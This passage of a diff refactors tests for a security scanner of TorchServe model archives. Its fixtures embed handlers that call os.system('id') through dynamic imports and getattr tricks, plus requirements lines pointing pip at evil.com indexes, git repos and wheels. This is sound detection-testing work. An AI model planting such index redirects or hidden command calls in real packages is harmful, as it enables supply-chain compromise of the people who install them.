         b"            return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_uses_rebound_state_at_explicit_raise() -> None:
@@ -2450,10 +2255,7 @@ def test_dynamic_import_handler_analysis_uses_rebound_state_at_explicit_raise() 
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_keeps_dangerous_state_at_explicit_raise() -> None:
@@ -2468,10 +2270,7 @@ def test_dynamic_import_handler_analysis_keeps_dangerous_state_at_explicit_raise
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_dangerous_state_at_nested_raise() -> None:
@@ -2487,10 +2286,7 @@ def test_dynamic_import_handler_analysis_keeps_dangerous_state_at_nested_raise()
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_does_not_restore_deleted_alias_at_raise() -> None:
@@ -2505,10 +2301,7 @@ def test_dynamic_import_handler_analysis_does_not_restore_deleted_alias_at_raise
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.skipif(sys.version_info < (3, 11), reason="except* requires Python 3.11+")
@@ -2525,10 +2318,7 @@ def test_dynamic_import_handler_analysis_merges_exception_group_handler_states()
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.skipif(sys.version_info < (3, 11), reason="except* requires Python 3.11+")
@@ -2544,10 +2334,7 @@ def test_dynamic_import_handler_analysis_chains_exception_group_handler_states()
         b"        module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_regular_exception_handlers_exclusive() -> None:
@@ -2562,10 +2349,7 @@ def test_dynamic_import_handler_analysis_keeps_regular_exception_handlers_exclus
         b"        module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.skipif(sys.version_info < (3, 11), reason="except* requires Python 3.11+")
@@ -2580,10 +2364,7 @@ def test_dynamic_import_handler_analysis_skips_unreachable_exception_group_handl
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -2607,10 +2388,7 @@ def test_dynamic_import_handler_analysis_skips_unreachable_exception_group_handl
 def test_dynamic_import_handler_analysis_merges_expression_and_helper_aliases(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -2955,10 +2733,7 @@ def test_dynamic_import_handler_analysis_merges_expression_and_helper_aliases(
 def test_dynamic_import_handler_analysis_ignores_statically_unreachable_aliases(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -3209,10 +2984,7 @@ def test_dynamic_import_handler_analysis_ignores_statically_unreachable_aliases(
 def test_dynamic_import_handler_analysis_preserves_reachable_aliases(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -3335,75 +3107,41 @@ def test_scan_allows_shadowed_direct_handler_primitives(tmp_path: Path, handler_
 
 
 def test_scan_detects_dunder_call_getattr_wrapped_handler_execution_primitive(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_getattr_handler_execution(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": (
-                b"import os\n\ndef handle(data, context):\n    return getattr(os, 'system').__call__('id')\n"
-            ),
-            "weights.bin": b"weights",
-        },
-        filename="dunder_call_getattr_handler.mar",
+        (b"import os\n\ndef handle(data, context):\n    return getattr(os, 'system').__call__('id')\n"),
+        ("dunder_call_getattr_handler.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
-
-    assert len(handler_failures) == 1
-    assert handler_failures[0].severity == IssueSeverity.CRITICAL
-    assert "os.system" in handler_failures[0].message
 
 
 def test_scan_allows_benign_getattr_handler_access(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_safe_getattr_handler(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": (
-                b"class Handler:\n"
-                b"    def __init__(self):\n"
-                b"        self._value = {'ok': True}\n"
-                b"\n"
-                b"    def handle(self, data, context):\n"
-                b"        return getattr(object=self, name='_value')\n"
-            ),
-            "weights.bin": b"weights",
-        },
-        filename="benign_getattr_handler.mar",
+        (
+            b"class Handler:\n"
+            b"    def __init__(self):\n"
+            b"        self._value = {'ok': True}\n"
+            b"\n"
+            b"    def handle(self, data, context):\n"
+            b"        return getattr(object=self, name='_value')\n"
+        ),
+        ("benign_getattr_handler.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
-
-    assert handler_failures == []
 
 
 def test_scan_allows_benign_dunder_call_getattr_handler_access(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_safe_getattr_handler(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": (
-                b"class Handler:\n"
-                b"    def _safe_value(self):\n"
-                b"        return {'ok': True}\n"
-                b"\n"
-                b"    def handle(self, data, context):\n"
-                b"        return getattr(self, '_safe_value').__call__()\n"
-            ),
-            "weights.bin": b"weights",
-        },
-        filename="benign_dunder_call_getattr_handler.mar",
+        (
+            b"class Handler:\n"
+            b"    def _safe_value(self):\n"
+            b"        return {'ok': True}\n"
+            b"\n"
+            b"    def handle(self, data, context):\n"
+            b"        return getattr(self, '_safe_value').__call__()\n"
+        ),
+        ("benign_dunder_call_getattr_handler.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
-
-    assert handler_failures == []
 
 
 def test_scan_accepts_clean_duplicate_handler_members(tmp_path: Path) -> None:
@@ -3591,33 +3329,23 @@ def test_non_handler_python_analysis_parses_each_helper_module_once(
 
 
 def test_non_handler_python_metadata_assignments_do_not_trigger_import_time_execution(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_inert_python_metadata(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
-            "utils.py": (
-                b'"""Metadata-only helper."""\n'
-                b'__all__ = ["transform"]\n'
-                b'__version__ = "1.0.0"\n'
-                b"import typing\n"
-                b"if typing.TYPE_CHECKING:\n"
-                b"    from typing import Any\n"
-                b'if __name__ == "__main__":\n'
-                b'    raise RuntimeError("cli only")\n'
-                b"\n"
-                b"def transform(data):\n"
-                b"    return data\n"
-            ),
-            "weights.bin": b"weights",
-        },
-        filename="metadata_only_utils.mar",
+        (
+            b'"""Metadata-only helper."""\n'
+            b'__all__ = ["transform"]\n'
+            b'__version__ = "1.0.0"\n'
+            b"import typing\n"
+            b"if typing.TYPE_CHECKING:\n"
+            b"    from typing import Any\n"
+            b'if __name__ == "__main__":\n'
+            b'    raise RuntimeError("cli only")\n'
+            b"\n"
+            b"def transform(data):\n"
+            b"    return data\n"
+        ),
+        ("metadata_only_utils.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
-    assert non_handler_failures == []
 
 
 def test_import_time_analysis_respects_type_checking_rebinding() -> None:
@@ -3651,23 +3379,11 @@ def test_import_time_analysis_checks_selected_guard_else_branches() -> None:
 
 
 def test_non_handler_python_logger_initialization_does_not_trigger_import_time_execution(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_inert_python_metadata(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
-            "utils.py": (
-                b"import logging as log\nlogger = log.getLogger(__name__)\n\ndef transform(data):\n    return data\n"
-            ),
-            "weights.bin": b"weights",
-        },
-        filename="logger_init_utils.mar",
+        (b"import logging as log\nlogger = log.getLogger(__name__)\n\ndef transform(data):\n    return data\n"),
+        ("logger_init_utils.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
-    assert non_handler_failures == []
 
 
 def test_non_handler_python_analysis_detects_malicious_init_module(tmp_path: Path) -> None:
@@ -3860,19 +3576,7 @@ def test_non_handler_python_analysis_read_failure_is_reported_without_aborting(
         filename="read_failure_utils.mar",
     )
 
-    original_read_member_bounded = TorchServeMarScanner._read_member_bounded
-
-    def read_with_failure(
-        self: TorchServeMarScanner,
-        archive: zipfile.ZipFile,
-        member_info: zipfile.ZipInfo,
-        max_bytes: int,
-    ) -> bytes:
-        if member_info.filename == "utils.py":
-            raise RuntimeError("CRC mismatch")
-        return original_read_member_bounded(self, archive, member_info, max_bytes)
-
-    monkeypatch.setattr(TorchServeMarScanner, "_read_member_bounded", read_with_failure)
+    _install_member_read_failure(monkeypatch, "utils.py")
 
     result = TorchServeMarScanner().scan(str(mar_path))
 
@@ -4331,25 +4035,14 @@ def test_manifest_parsing_respects_entry_limit_for_duplicate_manifest_floods(
     )
 
     scanner = TorchServeMarScanner(config={"max_mar_entries": 2})
-    real_read_member_bounded = scanner._read_member_bounded
-    manifest_read_count = 0
-
-    def counting_read_member_bounded(
-        archive: zipfile.ZipFile,
-        member_info: zipfile.ZipInfo,
-        max_bytes: int,
-    ) -> bytes:
-        nonlocal manifest_read_count
-        if member_info.filename == "MAR-INF/MANIFEST.json":
-            manifest_read_count += 1
-        return real_read_member_bounded(archive, member_info, max_bytes)
-
-    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)
+    manifest_read_count = _count_matching_member_reads(
+        monkeypatch, scanner, lambda name: name == "MAR-INF/MANIFEST.json"
+    )
 
     result = scanner.scan(str(mar_path))
 
     assert result.success is False
-    assert manifest_read_count == 2
+    assert manifest_read_count[0] == 2
     entry_limit_failures = _failed_checks(result, "TorchServe Manifest Entry Limit")
     assert len(entry_limit_failures) == 1
     assert entry_limit_failures[0].severity == IssueSeverity.INFO
@@ -4377,25 +4070,14 @@ def test_manifest_parsing_respects_uncompressed_budget_for_duplicate_manifest_fl
     )
 
     scanner = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": len(manifest_bytes)})
-    real_read_member_bounded = scanner._read_member_bounded
-    manifest_read_count = 0
-
-    def counting_read_member_bounded(
-        archive: zipfile.ZipFile,
-        member_info: zipfile.ZipInfo,
-        max_bytes: int,
-    ) -> bytes:
-        nonlocal manifest_read_count
-        if member_info.filename == "MAR-INF/MANIFEST.json":
-            manifest_read_count += 1
-        return real_read_member_bounded(archive, member_info, max_bytes)
-
-    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)
+    manifest_read_count = _count_matching_member_reads(
+        monkeypatch, scanner, lambda name: name == "MAR-INF/MANIFEST.json"
+    )
 
     result = scanner.scan(str(mar_path))
 
     assert result.success is False
-    assert manifest_read_count == 1
+    assert manifest_read_count[0] == 1
     budget_failures = _failed_checks(result, "TorchServe Manifest Uncompressed Size Budget")
     assert len(budget_failures) == 1
     assert budget_failures[0].severity == IssueSeverity.INFO
@@ -4461,25 +4143,12 @@ def test_handler_analysis_respects_entry_limit_for_manifest_handler_fanout(
     )
 
     scanner = TorchServeMarScanner(config={"max_mar_entries": 2})
-    real_read_member_bounded = scanner._read_member_bounded
-    handler_read_count = 0
-
-    def counting_read_member_bounded(
-        archive: zipfile.ZipFile,
-        member_info: zipfile.ZipInfo,
-        max_bytes: int,
-    ) -> bytes:
-        nonlocal handler_read_count
-        if member_info.filename.startswith("handlers/"):
-            handler_read_count += 1
-        return real_read_member_bounded(archive, member_info, max_bytes)
-
-    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)
+    handler_read_count = _count_matching_member_reads(monkeypatch, scanner, lambda name: name.startswith("handlers/"))
 
     result = scanner.scan(str(mar_path))
 
     assert result.success is False
-    assert handler_read_count == 2
+    assert handler_read_count[0] == 2
     entry_limit_failures = _failed_checks(result, "TorchServe Handler Entry Limit")
     assert len(entry_limit_failures) == 1
     assert entry_limit_failures[0].severity == IssueSeverity.INFO
@@ -4512,25 +4181,12 @@ def test_handler_analysis_respects_uncompressed_budget_for_manifest_handler_fano
     )
 
     scanner = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": len(handler_source)})
-    real_read_member_bounded = scanner._read_member_bounded
-    handler_read_count = 0
-
-    def counting_read_member_bounded(
-        archive: zipfile.ZipFile,
-        member_info: zipfile.ZipInfo,
-        max_bytes: int,
-    ) -> bytes:
-        nonlocal handler_read_count
-        if member_info.filename.startswith("handlers/"):
-            handler_read_count += 1
-        return real_read_member_bounded(archive, member_info, max_bytes)
-
-    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)
+    handler_read_count = _count_matching_member_reads(monkeypatch, scanner, lambda name: name.startswith("handlers/"))
 
     result = scanner.scan(str(mar_path))
 
     assert result.success is False
-    assert handler_read_count == 1
+    assert handler_read_count[0] == 1
     budget_failures = _failed_checks(result, "TorchServe Handler Uncompressed Size Budget")
     assert len(budget_failures) == 1
     assert budget_failures[0].severity == IssueSeverity.INFO
@@ -4902,141 +4558,39 @@ def test_core_mar_fallback_rejects_boolean_size_limit_config(tmp_path: Path) -> 
 
 
 def test_scan_flags_non_pypi_requirements_index_as_critical(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"--index-url http://evil.com/simple\nnumpy==1.26.4\n",
-        },
-        filename="requirements_evil_index.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
-    assert any(
-        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    _assert_critical_requirements(
+        tmp_path, (b"--index-url http://evil.com/simple\nnumpy==1.26.4\n"), ("requirements_evil_index.mar")
     )
 
 
 def test_scan_flags_non_pypi_requirements_index_equals_form_as_critical(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"--index-url=https://evil.com/simple\nnumpy==1.26.4\n",
-        },
-        filename="requirements_evil_index_equals.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
-    assert any(
-        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    _assert_critical_requirements(
+        tmp_path, (b"--index-url=https://evil.com/simple\nnumpy==1.26.4\n"), ("requirements_evil_index_equals.mar")
     )
 
 
 def test_scan_flags_non_pypi_requirements_short_index_option_as_critical(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"-i https://evil.com/simple\nnumpy==1.26.4\n",
-        },
-        filename="requirements_evil_index_short.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
-    assert any(
-        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    _assert_critical_requirements(
+        tmp_path, (b"-i https://evil.com/simple\nnumpy==1.26.4\n"), ("requirements_evil_index_short.mar")
     )
 
 
 def test_scan_flags_non_pypi_requirements_concatenated_short_index_option_as_critical(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"-ihttps://evil.com/simple\nnumpy==1.26.4\n",
-        },
-        filename="requirements_evil_index_concatenated_short.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
-    assert any(
-        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    _assert_critical_requirements(
+        tmp_path, (b"-ihttps://evil.com/simple\nnumpy==1.26.4\n"), ("requirements_evil_index_concatenated_short.mar")
     )
 
 
 def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"-e git+https://evil.com/repo#egg=evilpkg\n",
-        },
-        filename="requirements_editable_git.mar",
+    _assert_editable_git_warning(
+        tmp_path, (b"-e git+https://evil.com/repo#egg=evilpkg\n"), ("requirements_editable_git.mar")
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
-    assert "editable_install" in reasons
-    assert "git_install" in reasons
 
 
 def test_scan_flags_editable_equals_git_requirements_as_warning(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"--editable=git+https://evil.com/repo#egg=evilpkg\n",
-        },
-        filename="requirements_editable_equals_git.mar",
+    _assert_editable_git_warning(
+        tmp_path, (b"--editable=git+https://evil.com/repo#egg=evilpkg\n"), ("requirements_editable_equals_git.mar")
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
-    assert "editable_install" in reasons
-    assert "git_install" in reasons
 
 
 def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path: Path) -> None:
@@ -5084,23 +4638,7 @@ def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path
 
 
 def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"numpy==1.26.4\ntorch==2.2.2\n",
-        },
-        filename="requirements_clean.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_checks) == 1
-    assert requirements_checks[0].status == CheckStatus.PASSED
+    _assert_clean_requirements(tmp_path, (b"numpy==1.26.4\ntorch==2.2.2\n"), ("requirements_clean.mar"))
 
 
 def test_scan_flags_colliding_requirements_txt_member_even_when_benign_alias_is_last(tmp_path: Path) -> None:
@@ -5173,68 +4711,28 @@ def test_scan_accepts_clean_colliding_requirements_txt_aliases(tmp_path: Path) -
 
 
 def test_scan_ignores_inline_comment_urls_in_safe_requirements(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"numpy==1.26.4  # docs http://example.com\n",
-        },
-        filename="requirements_comment_url.mar",
+    _assert_clean_requirements(
+        tmp_path, (b"numpy==1.26.4  # docs http://example.com\n"), ("requirements_comment_url.mar")
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_checks) == 1
-    assert requirements_checks[0].status == CheckStatus.PASSED
 
 
 def test_scan_accepts_local_find_links_and_pypi_short_index(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_clean_requirements(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": (
-                b"-i https://pypi.org/simple\n"
-                b"--extra-index-url=https://files.pythonhosted.org/simple\n"
-                b"--find-links file:///opt/wheels\n"
-                b"numpy==1.26.4\n"
-            ),
-        },
-        filename="requirements_local_find_links.mar",
+        (
+            b"-i https://pypi.org/simple\n"
+            b"--extra-index-url=https://files.pythonhosted.org/simple\n"
+            b"--find-links file:///opt/wheels\n"
+            b"numpy==1.26.4\n"
+        ),
+        ("requirements_local_find_links.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_checks) == 1
-    assert requirements_checks[0].status == CheckStatus.PASSED
 
 
 def test_scan_accepts_local_direct_url_requirement(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"torch @ file:///opt/wheels/torch.whl\n",
-        },
-        filename="requirements_local_direct_url.mar",
+    _assert_clean_requirements(
+        tmp_path, (b"torch @ file:///opt/wheels/torch.whl\n"), ("requirements_local_direct_url.mar")
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_checks) == 1
-    assert requirements_checks[0].status == CheckStatus.PASSED
 
 
 def test_scan_analyzes_local_included_requirements_files(tmp_path: Path) -> None:
@@ -5349,27 +4847,7 @@ def test_scan_flags_external_local_requirements_include_as_warning(
     requirements_line: str,
     filename: str,
 ) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": requirements_line.encode("utf-8"),
-        },
-        filename=filename,
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    assert any(
-        finding["reason"] == "external_requirements_include"
-        for finding in requirements_failures[0].details.get("findings", [])
-    )
+    _assert_external_requirements_warning(tmp_path, requirements_line, filename, ("external_requirements_include"))
 
 
 def test_scan_accepts_clean_local_included_requirements_files(tmp_path: Path) -> None:
@@ -5394,49 +4872,17 @@ def test_scan_accepts_clean_local_included_requirements_files(tmp_path: Path) ->
 
 
 def test_scan_flags_remote_requirements_include_as_warning(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_warning_requirements(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"-r https://evil.com/requirements.txt\n",
-        },
-        filename="requirements_remote_include.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    assert any(
-        finding["reason"] == "remote_requirements_include"
-        for finding in requirements_failures[0].details.get("findings", [])
+        (b"-r https://evil.com/requirements.txt\n"),
+        ("requirements_remote_include.mar"),
+        ("remote_requirements_include"),
     )
 
 
 def test_scan_flags_direct_url_requirement_as_warning(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": b"torch @ https://evil.com/pkg.whl\n",
-        },
-        filename="requirements_direct_url.mar",
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    assert any(
-        finding["reason"] == "direct_url_install" for finding in requirements_failures[0].details.get("findings", [])
+    _assert_warning_requirements(
+        tmp_path, (b"torch @ https://evil.com/pkg.whl\n"), ("requirements_direct_url.mar"), ("direct_url_install")
     )
 
 
@@ -5452,69 +4898,20 @@ def test_scan_flags_concatenated_editable_short_requirements_as_warning(
     requirements_line: str,
     filename: str,
 ) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
-        tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
-            "requirements.txt": requirements_line.encode("utf-8"),
-        },
-        filename=filename,
-    )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
-
-    assert len(requirements_failures) == 1
-    assert requirements_failures[0].severity == IssueSeverity.WARNING
-    assert any(
-        finding["reason"] == "editable_install" for finding in requirements_failures[0].details.get("findings", [])
-    )
+    _assert_external_requirements_warning(tmp_path, requirements_line, filename, ("editable_install"))
 
 
 def test_scan_flags_bare_direct_url_with_userinfo_as_warning(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_warning_requirements(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
-            "weights.bin": b"weights",
